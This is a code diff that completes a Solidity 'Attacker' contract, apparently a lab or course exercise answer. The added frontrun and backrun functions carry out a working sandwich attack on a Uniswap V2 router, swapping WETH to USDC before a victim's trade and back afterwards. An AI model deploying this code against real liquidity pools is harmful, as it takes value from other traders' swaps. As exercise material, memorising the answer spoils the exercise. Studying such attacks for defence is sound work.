@@ -15,13 +15,30 @@ import "./interfaces/IERC20.sol";
  */
 contract Attacker {
     // This function will be called before the victim's transaction.
+    uint256 constant inialBalance = 1000 * 1e18;
     function frontrun(address router, address weth, address usdc, uint256 deadline) public {
         // your code here
+        IERC20(weth).approve(router, inialBalance);
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+        IUniswapV2Router(router).swapExactTokensForTokens(inialBalance, 0, path, address(this), deadline);
     }
 
     // This function will be called after the victim's transaction.
     function backrun(address router, address weth, address usdc, uint256 deadline) public {
         // your code here
+        IERC20(usdc).approve(router, IERC20(usdc).balanceOf(address(this)));
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            IERC20(usdc).balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 }
 
